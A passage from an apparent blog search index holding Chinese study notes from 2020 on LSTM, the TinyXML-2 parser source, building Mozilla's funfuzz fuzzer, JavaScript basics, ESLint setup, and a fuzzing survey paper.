区别于其他使用概率语言模型的方法，Montage的独特之处在于引入了代码碎片这个概念，其他同类方法一般采用的是逐个节点生成AST的方式，而这样的生成方式的语言模型往往会丢失一些上下文节点中的语义信息。使用代码碎片这个粒度的生成方式，可以比较好的利用这些信息。\n其他参考内容 知乎专栏 人人都能看懂的LSTM\n极客兔兔 LSTM文本分类\nCSDN 小白都能看懂的softmax详解\n知乎专栏 常用激活函数汇总\n","id":5,"section":"posts","summary":"\u003cp\u003eLSTM入门学习笔记\u003c/p\u003e","tags":["LSTM","RNN"],"title":"LSTM入门笔记","uri":"https://qeryu.github.io/2020/08/lstm%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"初中同学拜托做的一个调研，正好自己也在做相关的内容，也就拿来看看啦\n背景材料 XML 可拓展标记语言 XML是Extensible Markup Language的缩写。主要用于将信息保存为便于计算机程序读取、解析的格式。\nXML 解析方式 参考资料：廖雪峰Java教程XML部分\n因为XML是一种树形结构的文档，它有两种标准的解析API：\n DOM：一次性读取XML，并在内存中表示为树形结构； SAX：以流的形式读取XML，使用事件回调。  DOM是Document Object Model的缩写，DOM模型就是把XML结构作为一个树形结构处理，从根节点开始，每个节点都可以包含任意个子节点。\n其他内容可以参考参考资料中的图示进行理解。虽然那个是以Java语言为载体写的例子，但是也能看，Java和C++在这方面区别不大。DOM应该一开始是为JS设计的，也能比较方便在其他语言上使用。\n项目概述 项目功能 TinyXML-2是一个轻量级的、高效的XML的C++语言解析器，能够十分轻松地将之集成进其他项目。\n简单来说，TinyXML-2能够解析XML文档，然后根据解析出的信息建立C++对象（DOM模型），这个模型可以用于读取、修改和保存。\n这个操作也可以反过来，也可以使用C++的对象来从头开始构建一个XML文档，支持新建节点、新建元素、添加属性等操作。\n主要的算法原理是First Child and Next Sibling Tree，即从根节点开始，顺序读取XML文档，建立DOM树。\n项目特点   TinyXML-2是个可以用于开源软件以及商业的小插件，使用的ZLib证书\n  TinyXML-2不依赖于C++的异常(Exception)，RTTI 以及 STL（说实话我不知道RTTI是啥）\n  TinyXML-2无法处理通过DTD(文档类型定义)或者是XSL(拓展样式表语言)约束的内容\n菜鸟教程 DTD教程 菜鸟教程 XSL语言\n  TinyXML-2使用UTF-8编码，注意C++代码以及XML文件的编码（好像有些机子上C++代码的默认编码是GBK？\n  DEMO 考虑到上一个文档写的太烂了，这次具体写写怎么让这个东西跑起来。\n运行环境：CodeBlocks\n  新建一个project\n  从GitHub上下载源代码，将源代码中tinyxml.2.h以及tinyxml2.h，添加到项目中\n  在同一个文件夹下新建一个dream.xml，内容需要符合xml的内容格式（见上文）\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;PLAY\u0026gt; \u0026lt;TITLE\u0026gt; 瞎写点东西就行 \u0026lt;/TITLE\u0026gt; \u0026lt;/PLAY\u0026gt;    将README中给出的demo抄进main，具体如下\n#include \u0026lt;iostream\u0026gt; #include \u0026quot;tinyxml2.h\u0026quot; using namespace std; using namespace tinyxml2; void example() { XMLDocument doc; doc.LoadFile(\u0026quot;dream.xml\u0026quot;); // Navigate to the title, using the convenience function, // with a dangerous lack of error checking. const char* title = doc.FirstChildElement( \u0026quot;PLAY\u0026quot; )-\u0026gt;FirstChildElement( \u0026quot;TITLE\u0026quot; )-\u0026gt;GetText(); printf( \u0026quot;Name of play (1): %s\\n\u0026quot;, title ); // Text is just another Node to TinyXML-2. The more // general way to get to the XMLText: XMLText* textNode = doc.FirstChildElement( \u0026quot;PLAY\u0026quot; )-\u0026gt;FirstChildElement( \u0026quot;TITLE\u0026quot; )-\u0026gt;FirstChild()-\u0026gt;ToText(); title = textNode-\u0026gt;Value(); printf( \u0026quot;Name of play (2): %s\\n\u0026quot;, title ); } int main() { example(); return 0; }    编译运行该project\n  代码组成 代码中类的结构 类的继承关系如下\n tinyxml2::XMLAttribute tinyxml2::XMLConstHandle tinyxml2::XMLHandle tinyxml2::XMLNode  tinyxml2::XMLComment tinyxml2::XMLDeclaration tinyxml2::XMLDocument tinyxml2::XMLElement tinyxml2::XMLText tinyxml2::XMLUnknown   tinyxml2::XMLVisitor  tinyxml2::XMLPrinter    代码中类的功能（部分） XMLAttribute 编辑配置标签、元素、文档的属性\nXMLNode 处理与节点相关的内容，作为以下六个类的超类。\nXMLComment 处理与XML文档中与注释相关的内容。\nXMLDeclaration 处理与XML文档中的声明相关的内容。\nXMLDocument 处理与XML文件直接相关的内容。\nXMLElement 处理与单个元素相关的内容。\nXMLText 处理与XML文档中纯文本相关的内容。\nXMLUnknown 他是unknown，我也unknown\n细节分析 主要思路：从demo的example函数开始，找到程序的入口，根据函数调用的顺序进行分析\n文档读入LoadFile XMLDocument doc; doc.LoadFile(\u0026quot;dream.xml\u0026quot;);  找到LoadFile函数，该函数在XMLDocument类下，负责根据文件名打开文件，并开始调用解析函数。\nLoadFile分为两个参数不同的函数，代码如下，已附上简单注释\n// 根据文件名打开文件 XMLError XMLDocument::LoadFile( const char* filename ) { if ( !filename ) { // 当文件名为空时报错 TIXMLASSERT( false ); SetError( XML_ERROR_FILE_COULD_NOT_BE_OPENED, 0, \u0026quot;filename=\u0026lt;null\u0026gt;\u0026quot; ); return _errorID; } Clear(); // 初始化读取相关内容 FILE* fp = callfopen( filename, \u0026quot;rb\u0026quot; ); // 二进制形式打开 if ( !fp ) { // 当文件不存在时报错 SetError( XML_ERROR_FILE_NOT_FOUND, 0, \u0026quot;filename=%s\u0026quot;, filename ); return _errorID; } LoadFile( fp ); // 调用另一个LoadFile函数进行进一步解析 fclose( fp ); // 关闭FILE指针 return _errorID; } // 通过FILE指针进行解析 XMLError XMLDocument::LoadFile( FILE* fp ) { Clear(); TIXML_FSEEK( fp, 0, SEEK_SET ); // 将FILE指针fp指向XML文件开头 // 在Windows平台下调用的是_fseeki64 if ( fgetc( fp ) == EOF \u0026amp;\u0026amp; ferror( fp ) != 0 ) { SetError( XML_ERROR_FILE_READ_ERROR, 0, 0 ); return _errorID; } TIXML_FSEEK( fp, 0, SEEK_END ); // 将FILE指针fp指向XML文件结尾 unsigned long long filelength; { const long long fileLengthSigned = TIXML_FTELL( fp ); // 在Windows平台下调用的是_ftelli64，由此得到XML文件的二进制表示下的长度 TIXML_FSEEK( fp, 0, SEEK_SET ); // 回到文件开头 if ( fileLengthSigned == -1L ) { // 当TIXML_FTELL发生错误时报错 SetError( XML_ERROR_FILE_READ_ERROR, 0, 0 ); return _errorID; } TIXMLASSERT( fileLengthSigned \u0026gt;= 0 ); // 断言保证值的有效性 filelength = static_cast\u0026lt;unsigned long long\u0026gt;(fileLengthSigned); // 转换类型保存文件长度 } const size_t maxSizeT = static_cast\u0026lt;size_t\u0026gt;(-1); // We'll do the comparison as an unsigned long long, because that's guaranteed to be at // least 8 bytes, even on a 32-bit platform. // 上文注释翻译：我们将以无符号长长的方式进行比较，因为即使在32位平台上，也能保证至少有8个字节。 if ( filelength \u0026gt;= static_cast\u0026lt;unsigned long long\u0026gt;(maxSizeT) ) { // 当文件过长时报错 // Cannot handle files which won't fit in buffer together with null terminator SetError( XML_ERROR_FILE_READ_ERROR, 0, 0 ); return _errorID; } if ( filelength == 0 ) { // 当文件为空时报错 SetError( XML_ERROR_EMPTY_DOCUMENT, 0, 0 ); return _errorID; } const size_t size = static_cast\u0026lt;size_t\u0026gt;(filelength); // 转存文件长度为“size” TIXMLASSERT( _charBuffer == 0 ); // 保证缓冲区初始值正常 _charBuffer = new char[size+1]; // 给字符缓冲区分配大小适合将要读取的XML的空间 const size_t read = fread( _charBuffer, 1, size, fp ); // 将XML文件内容放入字符缓冲区 if ( read != size ) { // 当读取失败时报错 SetError( XML_ERROR_FILE_READ_ERROR, 0, 0 ); return _errorID; } _charBuffer[size] = 0; // 字符缓冲区末尾设零 Parse(); // 正式开始解析XML文件 return _errorID; }  fseek() ,fseeko(),fseeko64()讲解\nC库函数 ftell函数讲解\n解析函数Parse() 上文最后开始正式解析XML文件，调用同为XMLDocument库中的Parse()函数\nvoid XMLDocument::Parse() { TIXMLASSERT( NoChildren() ); // Clear() must have been called previously // 保证DOM树目前为空（最初已经通过Clear()函数清空上次读取时的残留数据 TIXMLASSERT( _charBuffer ); // 保证缓冲区已经有文件读入，避免空读出错 _parseCurLineNum = 1; // 当前行行号 _parseLineNum = 1; // 已解析行数 char* p = _charBuffer; // 指针p开始逐位解析读入到缓冲区的XML文件 p = XMLUtil::SkipWhiteSpace( p, \u0026amp;_parseCurLineNum ); // 调用XMLUtil库的函数，设置解析过程中对WhiteSpace的处理 p = const_cast\u0026lt;char*\u0026gt;( XMLUtil::ReadBOM( p, \u0026amp;_writeBOM ) ); // 对XML文件开头的BOM编码进行检查 if ( !*p ) { // 对空文件（在BOM编码之后为空）进行报错 SetError( XML_ERROR_EMPTY_DOCUMENT, 0, 0 ); return; } ParseDeep(p, 0, \u0026amp;_parseCurLineNum ); // 进一步开始解析文档正文 }  XML的BOM编码\n什么是white space属性：MDN web docs\nXML正文解析函数ParseDeep 该方法中比较长的注释在此说明：\n这是一个递归调用的方法，请尽量从当前层次进行考虑\n根据读取的方式（类似DFS的思想），会出现一个问题，成对出现的元素的关闭元素会在这个标签的子元素被解析的时候解析到。\n\u0026rsquo;endTag\u0026rsquo;指当前节点的关闭标签，他将通过调用子节点进行返回\n\u0026lsquo;parentEnd\u0026rsquo;时当前节点的父节点的关闭标签，他将被填写然后返回。\nchar* XMLNode::ParseDeep( char* p, StrPair* parentEndTag, int* curLineNumPtr ) // 由于XMLDocument类没有重载这个函数，所以调用的会是其超类的XMLNode::ParseDeep { XMLDocument::DepthTracker tracker(_document); if (_document-\u0026gt;Error()) return 0; while( p \u0026amp;\u0026amp; *p ) { // 循环解析各个节点 XMLNode* node = 0; p = _document-\u0026gt;Identify( p, \u0026amp;node ); // 检查XML文档的格式是否完整，是否合法 TIXMLASSERT( p ); // 确保文档可读取 if ( node == 0 ) { // 当前节点啥都不是的时候退出循环（相当于读取结束） break; } const int initialLineNum = node-\u0026gt;_parseLineNum; // 确定初始行 StrPair endTag; p = node-\u0026gt;ParseDeep( p, \u0026amp;endTag, curLineNumPtr ); if ( !p ) { // p为null时报错 DeleteNode( node ); if ( !_document-\u0026gt;Error() ) { _document-\u0026gt;SetError( XML_ERROR_PARSING, initialLineNum, 0); } break; } const XMLDeclaration* const decl = node-\u0026gt;ToDeclaration(); // 判断是不是\u0026quot;声明\u0026quot;，并进行处理 if ( decl ) { // 当前节点是声明 // Declarations are only allowed at document level // 只允许在文档层面出现声明，且若需要多个声明，需要放置在其他内容前 // Multiple declarations are allowed but all declarations // must occur before anything else. // // Optimized due to a security test case. If the first node is // a declaration, and the last node is a declaration, then only // declarations have so far been added. bool wellLocated = false; if (ToDocument()) { if (FirstChild()) { // 若已有第一个节点，需要满足当前节点是声明，最后一个节点也是声明，才算是合乎语法 wellLocated = FirstChild() \u0026amp;\u0026amp; FirstChild()-\u0026gt;ToDeclaration() \u0026amp;\u0026amp; LastChild() \u0026amp;\u0026amp; LastChild()-\u0026gt;ToDeclaration(); } else { // 其他情况均合乎语法 wellLocated = true; } } if ( !wellLocated ) { _document-\u0026gt;SetError( XML_ERROR_PARSING_DECLARATION, initialLineNum, \u0026quot;XMLDeclaration value=%s\u0026quot;, decl-\u0026gt;Value()); DeleteNode( node ); break; } } XMLElement* ele = node-\u0026gt;ToElement(); // 判断是不是元素，并处理 if ( ele ) { // We read the end tag. Return it to the parent. if ( ele-\u0026gt;ClosingType() == XMLElement::CLOSING ) { // 若是关闭标签，交由父节点处理 if ( parentEndTag ) { ele-\u0026gt;_value.TransferTo( parentEndTag ); } node-\u0026gt;_memPool-\u0026gt;SetTracked(); // created and then immediately deleted. DeleteNode( node ); return p; } // Handle an end tag returned to this level. // And handle a bunch of annoying errors. // 当当前节点不是关闭标签，可以处理调回的关闭标签，与上文对应 bool mismatch = false; if ( endTag.Empty() ) { // 当是调回的情况，当前节点的关闭标签一定是已知并保存的 if ( ele-\u0026gt;ClosingType() == XMLElement::OPEN ) { // 检查调回的关闭标签是否与当前标签匹配 // 未保存且标签匹配 mismatch = true; } } else { if ( ele-\u0026gt;ClosingType() != XMLElement::OPEN ) { // 保存但标签不匹配 mismatch = true; } else if ( !XMLUtil::StringEqual( endTag.GetStr(), ele-\u0026gt;Name() ) ) { // 标签不匹配 mismatch = true; } } if ( mismatch ) { // 根据非正常状况进行报错 _document-\u0026gt;SetError( XML_ERROR_MISMATCHED_ELEMENT, initialLineNum, \u0026quot;XMLElement name=%s\u0026quot;, ele-\u0026gt;Name()); DeleteNode( node ); break; } } InsertEndChild( node ); // 添加子节点 } return 0; }  当前行格式检查Identify char* XMLDocument::Identify( char* p, XMLNode** node ) { TIXMLASSERT( node ); // 当前节点 TIXMLASSERT( p ); // 文档位置指针 char* const start = p; // 开始检查的位置 int const startLine = _parseCurLineNum; // 开始检查的行号 p = XMLUtil::SkipWhiteSpace( p, \u0026amp;_parseCurLineNum ); // 跳过空白符 if( !*p ) { *node = 0; TIXMLASSERT( p ); return p; } // These strings define the matching patterns: // 以下字符串规定了匹配规则 static const char* xmlHeader\t= { \u0026quot;\u0026lt;?\u0026quot; }; // 文档开头 static const char* commentHeader\t= { \u0026quot;\u0026lt;!--\u0026quot; }; // 注释开头 static const char* cdataHeader\t= { \u0026quot;\u0026lt;![CDATA[\u0026quot; }; // CDATA内容开头 static const char* dtdHeader\t= { \u0026quot;\u0026lt;!\u0026quot; }; // DTD内容开头 static const char* elementHeader\t= { \u0026quot;\u0026lt;\u0026quot; };\t// and a header for everything else; check last. // 最后检查最常见的开头 // 规定开头内容的长度 static const int xmlHeaderLen\t= 2; static const int commentHeaderLen\t= 4; static const int cdataHeaderLen\t= 9; static const int dtdHeaderLen\t= 2; static const int elementHeaderLen\t= 1; TIXMLASSERT( sizeof( XMLComment ) == sizeof( XMLUnknown ) );\t// use same memory pool TIXMLASSERT( sizeof( XMLComment ) == sizeof( XMLDeclaration ) );\t// use same memory pool XMLNode* returnNode = 0; // 以下内容为逐个试着判断当前行的内容，仅解释第一个，剩下的同理 if ( XMLUtil::StringEqual( p, xmlHeader, xmlHeaderLen ) ) { // 判断是否为XML文档头 returnNode = CreateUnlinkedNode\u0026lt;XMLDeclaration\u0026gt;( _commentPool ); // 将当前节点标记为文档头 returnNode-\u0026gt;_parseLineNum = _parseCurLineNum; // 当前节点对应的行标记为当前行 p += xmlHeaderLen; // p指针向后跳到该节点的正文位置 } else if ( XMLUtil::StringEqual( p, commentHeader, commentHeaderLen ) ) { returnNode = CreateUnlinkedNode\u0026lt;XMLComment\u0026gt;( _commentPool ); returnNode-\u0026gt;_parseLineNum = _parseCurLineNum; p += commentHeaderLen; } else if ( XMLUtil::StringEqual( p, cdataHeader, cdataHeaderLen ) ) { XMLText* text = CreateUnlinkedNode\u0026lt;XMLText\u0026gt;( _textPool ); returnNode = text; returnNode-\u0026gt;_parseLineNum = _parseCurLineNum; p += cdataHeaderLen; text-\u0026gt;SetCData( true ); } else if ( XMLUtil::StringEqual( p, dtdHeader, dtdHeaderLen ) ) { returnNode = CreateUnlinkedNode\u0026lt;XMLUnknown\u0026gt;( _commentPool ); returnNode-\u0026gt;_parseLineNum = _parseCurLineNum; p += dtdHeaderLen; } else if ( XMLUtil::StringEqual( p, elementHeader, elementHeaderLen ) ) { returnNode = CreateUnlinkedNode\u0026lt;XMLElement\u0026gt;( _elementPool ); returnNode-\u0026gt;_parseLineNum = _parseCurLineNum; p += elementHeaderLen; } else { //当匹配了一圈发现啥都不是的时候，标记当前节点为纯文本 returnNode = CreateUnlinkedNode\u0026lt;XMLText\u0026gt;( _textPool ); returnNode-\u0026gt;_parseLineNum = _parseCurLineNum; // Report line of first non-whitespace character p = start;\t// Back it up, all the text counts. // 回退到开始检查的位置 _parseCurLineNum = startLine; } // 确保这两者均有收获 TIXMLASSERT( returnNode ); TIXMLASSERT( p ); // 返回结果 *node = returnNode; return p; }  CDATA内容是什么\nXML DTD\n就写到这儿吧，这些也够那哥们交作业了，不写了，毕竟我不常用C++\u0026hellip;\n","id":6,"section":"posts","summary":"\u003cp\u003e初中同学拜托做的一个调研，正好自己也在做相关的内容，也就拿来看看啦\u003c/p\u003e","tags":["XML","C++"],"title":"TinyXML-2学习笔记","uri":"https://qeryu.github.io/2020/06/tinyxml-2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"funfuzz是 Mozilla 开源的一个JavaScript fuzzer 工具集合，提供了一个针对 Mozilla 的 Spidermonkey 的有力fuzz工具。\nSpideMonkey  SpiderMonkey是世界上第一款JavaScript引擎，由前网景公司的布兰登·艾克设计，后期由Mozilla基金会维护，以开放源代码发布。目前为Mozilla Firefox网页浏览器所使用的JavaScript引擎，并也被嵌入到其他许多环境，例如GNOME 3桌面。\nFrom Wikipedia\n 官方文档：SpiderMonkey: The Mozilla JavaScript runtime\n在 Mozilla 官方对 SpiderMonkey 的文档中提到，这个JavaScript引擎是用C/C++写的，而在这上，还有构建的一个JS Shell，还没闹明白是咋用的呢。\n安装文档 Building SpiderMonkey\nBuild 过程 clone funfuzz仓库到本地 # 我是直接保存到了根目录下 git clone https://github.com/MozillaSecurity/funfuzz.git  通过 pip 安装所需的软件包（可能出现问题，后文有说） cd ~/funfuzz pip install -r requirements.txt # or pip3 install -r requirements.txt  下载 Mozilla - central mkdir -p ~/trees/ hg clone https://hg.mozilla.org/mozilla-central/ ~/trees/mozilla-central/  在这个mozilla-central中，有 Mozilla 自家的多功能构建工具mach以及一系列在进行 Mozilla 相关操作的时候需要用到资源。\n开发者（debug） Build 设定一个 MOZCONFIG mkdir -p ~/mozconfigs  新建一个debug文件，文件内容是\n# Build only the JS shell ac_add_options --enable-application=js # Disable Optimization, for the most accurate debugging experience ac_add_options --disable-optimize # Enable the debugging tools: Assertions, debug only code etc. ac_add_options --enable-debug  设置环境变量 export MOZCONFIG=$HOME/mozconfigs/debug  Building 使用 Mozilla - central 中的mach工具进行构建\ncd ~/trees/mozilla-central/ ./mach build  过程中可能会提示需要先进行一步（关于bootstrap是啥我刚刚也查了一下，相关资料在后面）\n./mach bootstrap  在安装的过程中有一系列选项，我粗略看了一下，恩，都看不懂，直接一路回车选默认了。\n安装完bootstrap之后，就可以通过一些指令来补充安装一些 build 过程所必需的内容了。\nJS Shell 官方文档：JavaScript Shell 简介\n这一部分还没有时间仔细看\u0026hellip;\nfunfuzz 在 GitHub 的文档中有如下提示\n 为了确保当多个实例同时崩溃时核心转储不会混淆，请运行：  echo -n 1 | sudo tee /proc/sys/kernel/core_uses_pid  安装32位库以编译32位二进制文件：   Debian / Ubuntu： sudo apt-get install lib32z1 gcc-multilib g++-multilib Fedora ：（已知可以使用Fedora，但是目前尚不知道确切的库名称。）  安装gdb：   Debian / Ubuntu： sudo apt-get install gdb Fedora：请确保已安装所有开发包（请参阅参考资料rpm -qa \u0026quot;*devel\u0026quot;）并运行yum install gdb  为clang / ASan构建安装clang：   Debian / Ubuntu： sudo apt-get install clang Clang用于64位版本，而GCC用于某些较旧的32位版本  过程踩坑 pip 版本 如果本地的 pip 对应的是 python2，可能会出现失败的情况。需要手动下载一个 python3 对应的 pip。\n关于 pip 的一些参考命令 pip简单教程\n除了如何搞定 pip3 ，我还找到了一些其他可能会用到的东西。\nLinux-Ubuntu16.04下Python3.5安装pip3以及scrapy、numpy、itchat\nbootstrap 是啥 bootstrap 中文网\n根据各种网上资料的描述\n Bootstrap 是一个用于快速开发 Web 应用程序和网站的前端框架。Bootstrap 是基于 HTML、CSS、JAVASCRIPT 的。\n Bootstrap 是一个工具包，其中包括很多内容\n  基本结构：Bootstrap 提供了一个带有网格系统、链接样式、背景的基本结构。这将在 Bootstrap 基本结构 部分详细讲解。 CSS：Bootstrap 自带以下特性：全局的 CSS 设置、定义基本的 HTML 元素样式、可扩展的 class，以及一个先进的网格系统。这将在 Bootstrap CSS 部分详细讲解。 组件：Bootstrap 包含了十几个可重用的组件，用于创建图像、下拉菜单、导航、警告框、弹出框等等。这将在 布局组件 部分详细讲解。 JavaScript 插件：Bootstrap 包含了十几个自定义的 jQuery 插件。您可以直接包含所有的插件，也可以逐个包含这些插件。这将在Bootstrap 插件部分详细讲解。 定制：您可以定制 Bootstrap 的组件、LESS 变量和 jQuery 插件来得到您自己的版本。  ","id":7,"section":"posts","summary":"\u003cp\u003e\u003ccode\u003efunfuzz\u003c/code\u003e是 Mozilla 开源的一个JavaScript fuzzer 工具集合，提供了一个针对 Mozilla 的 Spidermonkey 的有力fuzz工具。\u003c/p\u003e","tags":["Fuzzing","JavaScript"],"title":"funfuzz学习笔记","uri":"https://qeryu.github.io/2020/05/funfuzz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"综合廖雪峰JavaScript教程、JavaScript入门课程等网络上各种教程。\n还是主要记录一些语法特性与从未接触的崭新知识\nJavaScript背景内容 Web发展史 Web前端工程是大部分和浏览器打交道。例如Node.js主要用的是Chrome的V8核心。\n浏览器始于Mosaic，进而分支成为IE（Microsoft）以及Firefox（Mozilla）\nJavaScript能够动态改变网页逻辑，提升用户体验，不再是静态网页。\n浏览器分为 Shell 和 Kernel 两个部分，内核是浏览器最主要的部分，包括：\n 渲染引擎（根据规则去绘制页面，每16ms刷新一次 JS引擎（处理JavaScript代码 其他模块（异步等东西  关于内核的一些历史：\n 2001年发布的IE6，首次实现了对JS引擎的优化与分离 2008年发布的Chrome浏览器，引擎代号V8，能把JS代码直接翻译成机械码，速度最快 Firefox 对路径优化也有一些优化 JeagerMonkey TraceMonkey  JavaScript是由C语言开发形成的\nJavaScript 特征  解释性语言（与Java这种oak语言，C这种编译型语言不同 引擎单线程（同一时间只能处理一件事（区分同步异步的概念） 使用ECMA标注（注意JScript和JavaScript不是一个东西）   html中的link标签就是异步的加载\nJavaScript也称为ECMAScrip（也就解释了ESLint的命名\n Jav0aScript 执行队列 轮转时间片（感觉和操作系统中\n的比较类似\n将任务分割为足够小的片段，然后将所有片段进行随机组合形成一个队列，用引擎执行这个队列，形成似乎同时进行的错觉。\n任务队列中任务片段排列完全随机，称为争抢时间片。\n组成部分 基本语法 相等运算符 JavaScript设计了两种运算符，==与===，经常产生一些漏洞以及诡异结果。\n== 会自动转换数据类型，很多时候会因为这个类型转换得到一个诡异结果\n=== 会先比较数据类型，再比较值。如果数据类型不一致就会返回 false\n尽量不要使用==，坚持使用===\nNaN NaN是数值运算的一种特殊值，通常表示未定义的或者是不可表示的值。理论上这个值与所有的其他的值都不相等。而且，NaN与他自己都不相等，只能通过isNaN()函数判断\nNaN === NaN; // false isNaN(NaN); // true  null 与 undefined    “空” 含义     null 表示空的值，真的就是啥都没有   0 数值0，还是有数值内容的   '' 长度为0的字符串   undefined 未定义的值     JavaScript的设计者希望用null表示一个空的值，而undefined表示值未定义。事实证明，这并没有什么卵用，区分两者的意义不大。大多数情况下，我们都应该用null。undefined仅仅在判断函数参数是否传递的情况下有用。\n 对象 粗略看类似于其他语言的map或者是dict类型，实际上应该是一般意义上的对象的简化版本，键-值得无序集合。\n要求键的类型都是字符串类型，值可以是任何数据类型。\nvar person = { name: 'Bob', age: 20, tags: ['js', 'web', 'mobile'], city: 'Beijing', hasCar: true, zipcode: null }; person.name; // 'Bob' person.zipcode; // null  动态类型语言 和Python类似，但是也可以用var声明变量（不强制要求），如果一个变量没有通过var申明就被引用的话，那么该变量自动被申明为全局变量，这样容易产生冲突以及误用。\nstrict 模式 可以在JavaScript代码的第一行标记上，这将把未使用var申明变量就使用的行为定义为ReferenceError\n'use strict';  https://www.liaoxuefeng.com/wiki/1022910821149312/1023020952022784\n","id":8,"section":"posts","summary":"\u003cp\u003e综合廖雪峰JavaScript教程、JavaScript入门课程等网络上各种教程。\u003c/p\u003e\n\u003cp\u003e还是主要记录一些语法特性与从未接触的崭新知识\u003c/p\u003e","tags":["JavaScript"],"title":"JavaScript学习笔记","uri":"https://qeryu.github.io/2020/05/javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"https://eslint.org/ 安装下来用用，多掌握一些工具\n功能 ESlint 是一款JavaScript代码检查工具，能够分析JavaScript源代码，找出其中的错误，节约debug时间。\n同类型的工具还有 JSlint以及JShint，这两种工具使用的固定规则进行分析，而ESlint可以使用用户自定义的规则，适用于自己有一套独有的开发规则的团队或者是个人。保证可以写出语法正确，代码风格一致的代码。\n能够自动开展以下工作\n 发现错误 执行规则 订正错误  安装 Getting Start with ESlint\n前置条件 需要已安装Node.js 版本要求 \u0026gt;=12.0.0，需要有SSL支持。（官方安装Node.js 自带SSL支持）\nNode.js 入门 - 掘金\n安装 # 使用 npm 或者 yarn npm install eslint --save-dev # OR yarn add eslint --dev  注意，以上安装是安装到了本地，本地安装与全局安装的区别\n简单来说，全局安装是可以让用户在命令行直接运行该组件包支持的命令，而本地安装是对于一个项目安装并配置一个Node模块。\n不建议全局安装ESlint，即使全局安装了， 也需要本地安装才能使用插件或者是共享一些配置。\n配置 npx命令解决了项目内安装模块的问题，通过这个命令可以在项目中本地初始化ESlint\n参考资料：npx使用教程 - 阮一峰\n# 生成对于该项目的配置文件 npx eslint --init  根据提示选择一系列配置之后，会在当前文件夹下创建 .eslintrc文件，在这个文件中会有相应的规则。\n配置相关信息 - 官方文档\n配置可以分为两种，配置注释与配置文件，前者根据js文件中的注释进行配置，后者则根据上文提到的配置文件进行配置。\n通过修改配置，可以控制ESlint处理代码的粒度。可以去配置以下内容\n 运行环境（用什么解析器，处在什么环境下） 指定一些全局变量（有特定的语法规则） 配置第三方插件（需要提前通过npm安装，并在配置文件中声明plugins） 配置规则（规则的状态（关闭，warning，error）  官方文档写的很详细，这里就不细说了。\n踩坑 node.js 安装版本 Ubuntu 上好像是没有自带 npm 包管理的，需要自己从 apt 中获取，可能会出现安装的npm以及nodejs版本与需要的不一致的现象，可以手动升级。\n# 升级 npm 到最新版（自己安装自己 npm i -g npm # 安装 npm 指定版本（可指定latest版本 npm i -g npm@6.4.1 npm i -g npm@latest  通过 npm 去更新 nodejs 的版本，可以下载一个 Node 的 n 工具包，里面提供了一些升级命令参数\n# 安装 n 工具包 npm install n -g # n 工具包中的一些升级命令 n # 显示现有的安装的Node的版本 n latest # 安装最新版本 n stable # 安装最新的稳定版本 n lts # 安装最新的LTS版 n version # 根据version参数给出的版本号安装  使用 命令行参数 命令行参数 - 官方文档\n# 运行 ESlint 以检测js文件 eslint file1.js file2.js  命令行参数中可以设置的大致有：\n 基本配置（配置文件是否启用，特定环境，全局变量，解析器 指定规则 指定插件 是否解决发现的问题 忽略文件（是否忽略，忽略哪些 输入输出（标准输入输出，文件输入输出 报告类型（仅报告错误，或者均报告 缓存文件（保存缓存信息，使用缓存信息，指定缓存位置 其他（初始化、调试、帮助  规则 官方规则列表\n官方给出了比较详细的规则，至少在我看来还是挺详细的（自己对JavaScript了解太少了）\n有很多规则是可以通过配置文件中的\u0026quot;extends\u0026quot;: \u0026quot;eslint:recommended\u0026quot;，直接进行开启的\n也有很多规则是可以通过命令行参数 --fix设置：发现错误并直接订正（上文文档中有提及）\nDEMO","id":9,"section":"posts","summary":"\u003cp\u003e\u003ca href=\"https://eslint.org/\"\u003ehttps://eslint.org/\u003c/a\u003e 安装下来用用，多掌握一些工具\u003c/p\u003e","tags":["JavaScript","ESlint"],"title":"ESlint调研学习使用","uri":"https://qeryu.github.io/2020/05/eslint%E8%B0%83%E7%A0%94%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","year":"2020"},{"content":"arXiv:1812.00140 (cs) The Art, Science, and Engineering of Fuzzing: A Survey的阅读感想与过程中遇到的问题\n我太菜了，一篇论文读了两个星期，真的好多不会的，要加紧学习了\n目标论文大致内容 文章将现有的模糊测试的研究进行了总结，并对现有的杂乱无章的模糊测试相关术语提出了一个统一的命名。\n还根据对模糊测试的过程的拆分，对现有的模糊测试研究（包括论文以及GitHub上的项目）进行了分类汇总。\n将模糊测试出现以来的大部分重要论文进行了归类。\n模糊测试过程 这一部分正好在我这篇文章的过程中，文明老师讲过一遍了\u0026hellip;节约大量时间\n相关的论文内容已经做好分类了，我也不在这里说了，直接上一个链接吧，在第八页有，以后有时间可以读读\n【腾讯文档】模糊测试技术进展报告_文明 https://docs.qq.com/slide/DSVZNY3p0am13RE1V\n预处理器（Processor） 主要进行两件事，程序插装、选择初始种子\n程序插桩  分为动态插装 和 静态插装 可以对程序的分支进行插装，记录分支的覆盖情况。但是同时有些技术会引起路径冲突，CollAFL [S\u0026amp;P 2018] 提出路径敏感的哈希方法，来记录路径覆盖信息，如此可以解决路径冲突的问题 还可以通过对程序的指定的关键信息进行插装，进行定向模糊测试  选择初始种子（Seed Selection） 通过一些算法去尽可能减小初始种子池（seed pool），选择最大覆盖率的最小种子集。\n种子修剪（Seed Trimming） 更小的种子可能会有更小的内存消耗，产生更加全面的效果。所以有些Fuzzer会选择调高小种子的优先级。\n准备驱动程序（Preparing a Driver Application） 要让Fuzzer能够成功调用PUT，需要在开始之前自己手写一个驱动。\n调度器（Scheduler） Fuzz Configuration Scheduling(FCS) Algorithm: 在此区分黑灰白盒，\n在模糊测试中，调度指选择一组合适的测试参数来开展下一轮测试迭代。BFF和AFLFast成功的关键在于他们创新的调度算法。\n模糊测试中，动态的添加与删除种子库中的种子，是探索程序不同状态，以保障测试有效性的关键。\n种子生成器（Input Generator） 随机生成（Random-based Generator） 随机生成字符串、数字，进行测试，这样具有一定的盲目性，比较难获得有效的结果\n基于模型生成（Model-based Generator）  基于语法生成：Zest [ISSTA 2019] 生成满足语法语义的JavaScript/XML 基于协议生成：T-Fuzz [ICST 2014] 